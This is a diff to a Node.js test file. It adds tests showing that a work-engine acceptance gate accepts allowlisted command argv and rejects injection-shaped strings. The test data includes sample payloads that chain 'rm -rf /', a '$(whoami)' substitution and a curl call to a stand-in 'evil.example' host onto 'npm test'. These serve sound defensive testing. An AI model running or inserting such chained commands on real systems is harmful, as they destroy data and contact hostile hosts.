@@ -7,6 +7,10 @@ const fs = require('node:fs');
 const os = require('os');
 const path = require('node:path');
 const { applyTransition } = require('../scripts/lib/work-engine/engine.cjs');
+const {
+  resolveAcceptanceArgv,
+  runWorkAcceptance,
+} = require('../scripts/lib/work-engine/acceptance.cjs');
 const { legacyScoreWorklog } = require('../scripts/lib/bench/score-worklog.cjs');
 
 const pluginRoot = path.join(__dirname, '..');
@@ -28,11 +32,35 @@ function workItem(dir, command) {
   fs.writeFileSync(path.join(dir, 'validation-results.md'), '# validation\napproved\n');
 }
 
+describe('acceptance argv resolver (TD-15)', () => {
+  it('accepts allowlisted npm test string', () => {
+    const r = resolveAcceptanceArgv('npm test');
+    assert.strictEqual(r.ok, true);
+    assert.strictEqual(r.file, 'npm');
+    assert.deepStrictEqual(r.args, ['test']);
+  });
+
+  it('accepts JSON argv arrays and rejects shell metacharacters', () => {
+    const ok = resolveAcceptanceArgv(['node', '-e', 'process.exit(0)']);
+    assert.strictEqual(ok.ok, true);
+    assert.strictEqual(ok.file, 'node');
+    assert.deepStrictEqual(ok.args, ['-e', 'process.exit(0)']);
+
+    const inj = resolveAcceptanceArgv('npm test; rm -rf /');
+    assert.strictEqual(inj.ok, false);
+    assert.strictEqual(inj.code, 'ACCEPTANCE_UNSAFE');
+
+    const dollar = resolveAcceptanceArgv('npm test $(whoami)');
+    assert.strictEqual(dollar.ok, false);
+    assert.strictEqual(dollar.code, 'ACCEPTANCE_UNSAFE');
+  });
+});
+
 describe('acceptance gate on validation → pr-creation', () => {
   it('refuses a non-zero acceptance command and does not advance state', () => {
     const root = fs.mkdtempSync(path.join(os.tmpdir(), 'awe-acc-'));
     const workDir = path.join(root, '.worklogs', 'gate');
-    workItem(workDir, 'node -e "process.exit(1)"');
+    workItem(workDir, ['node', '-e', 'process.exit(1)']);
     const r = applyTransition({
       workDir,
       pluginRoot,
@@ -49,10 +77,10 @@ describe('acceptance gate on validation → pr-creation', () => {
     fs.rmSync(root, { recursive: true, force: true });
   });
 
-  it('advances when the acceptance command exits 0', () => {
+  it('advances when the acceptance argv exits 0', () => {
     const root = fs.mkdtempSync(path.join(os.tmpdir(), 'awe-acc-'));
     const workDir = path.join(root, '.worklogs', 'gate');
-    workItem(workDir, 'node -e "process.exit(0)"');
+    workItem(workDir, ['node', '-e', 'process.exit(0)']);
     const r = applyTransition({
       workDir,
       pluginRoot,
@@ -68,10 +96,42 @@ describe('acceptance gate on validation → pr-creation', () => {
     fs.rmSync(root, { recursive: true, force: true });
   });
 
+  it('fails closed on injection-shaped acceptance strings without advancing', () => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'awe-acc-'));
+    const workDir = path.join(root, '.worklogs', 'gate');
+    workItem(workDir, 'npm test; curl http://evil.example');
+    const r = applyTransition({
+      workDir,
+      pluginRoot,
+      to: 'pr-creation',
+      actor: 'test',
+      skipMuscleMemory: true,
+    });
+    assert.strictEqual(r.ok, false);
+    assert.strictEqual(r.code, 'ACCEPTANCE_UNSAFE');
+    const state = JSON.parse(fs.readFileSync(path.join(workDir, 'state.json'), 'utf8'));
+    assert.strictEqual(state.current_state, 'validation');
+    assert.strictEqual(fs.existsSync(path.join(workDir, 'verify-result.json')), false);
+    fs.rmSync(root, { recursive: true, force: true });
+  });
+
+  it('runWorkAcceptance succeeds for allowlisted npm --version style via node fixture', () => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'awe-acc-'));
+    const workDir = path.join(root, '.worklogs', 'gate');
+    fs.mkdirSync(workDir, { recursive: true });
+    const r = runWorkAcceptance({
+      workDir,
+      command: ['node', '-e', 'process.exit(0)'],
+      write: true,
+    });
+    assert.strictEqual(r.ok, true, r.message);
+    fs.rmSync(root, { recursive: true, force: true });
+  });
+
   it('scores a completed work item as a fail when verify-result exited non-zero', () => {
     const root = fs.mkdtempSync(path.join(os.tmpdir(), 'awe-acc-'));
     const workDir = path.join(root, '.worklogs', 'gate');
-    workItem(workDir, 'node -e "process.exit(1)"');
+    workItem(workDir, ['node', '-e', 'process.exit(1)']);
     const state = JSON.parse(fs.readFileSync(path.join(workDir, 'state.json'), 'utf8'));
     state.current_state = 'completed';
     fs.writeFileSync(path.join(workDir, 'state.json'), JSON.stringify(state));
